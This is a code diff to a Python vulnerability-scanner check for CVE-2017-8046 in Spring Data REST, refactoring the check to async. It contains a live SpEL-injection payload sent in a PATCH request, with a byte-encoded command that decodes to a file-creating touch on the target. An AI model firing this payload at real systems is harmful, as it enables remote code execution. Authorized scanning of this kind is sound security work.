@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import json
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2017_8046_BaseVerify:
     def __init__(self, url):
@@ -32,7 +32,7 @@ class CVE_2017_8046_BaseVerify:
         }
         self.data2 = [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,46,47,116,101,115,116,46,106,115,112}))/lastName", "value": "vulapps-demo" }]
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -43,17 +43,14 @@ class CVE_2017_8046_BaseVerify:
         """
         
         try:
-            response1 = request.post(self.url + '/customers', headers = self.headers1, data = json.dumps(self.data1))
-            response2 = request.patch(self.url + '/customers/1', headers = self.headers2, data = json.dumps(self.data2))
-            content2 = response2.text
+            response1 = await request.post(self.url + '/customers', headers = self.headers1, data = json.dumps(self.data1))
+            response2 = await request.patch(self.url + '/customers/1', headers = self.headers2, data = json.dumps(self.data2))
+            content2 = await response2.text()
             if 'maybe not public' in content2:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
         
 if __name__ == '__main__':
